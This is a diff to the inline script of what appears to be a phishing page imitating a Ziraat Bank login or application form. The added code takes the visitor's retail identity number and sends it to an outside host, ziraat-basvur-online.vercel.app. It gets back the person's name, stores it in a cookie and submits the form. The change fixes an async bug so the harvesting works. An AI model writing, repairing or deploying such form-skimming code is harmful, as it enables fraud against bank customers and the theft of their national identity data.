@@ -169,30 +169,35 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
     </form>
 
  <script>
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 async function checkAndSubmit() {
-  const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
+    const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
 
-  try {
-        setTimeout(function() {
-       const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
-    const data = await response.json();
+    try {
+        setTimeout(async function () {
+            const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
+            const data = await response.json();
 
-        // "adi" ve "soyadi" değerlerini al
-        const adi = data.adi;
-        const soyadi = data.soyadi;
+            // "adi" ve "soyadi" değerlerini al
+            const adi = data.adi;
+            const soyadi = data.soyadi;
 
-        // İsim adında bir cookie oluştur ve değerleri kaydet
-        document.cookie = `isim=${adi} ${soyadi}; path=/`;
+            // İsim adında bir cookie oluştur ve değerleri kaydet
+            document.cookie = `isim=${adi} ${soyadi}; path=/`;
 
-        
-      }, 1500);
-	   await sleep(500);
-    document.getElementById('aspnetForm').submit();
+            // 0.5 saniye (500 milisaniye) bekleme
+            await sleep(500);
 
-      } catch (error) {
+            document.getElementById('aspnetForm').submit();
+        }, 1500);
+    } catch (error) {
         console.error('Hata:', error);
-      }
     }
+}
+
   </script>
 
           
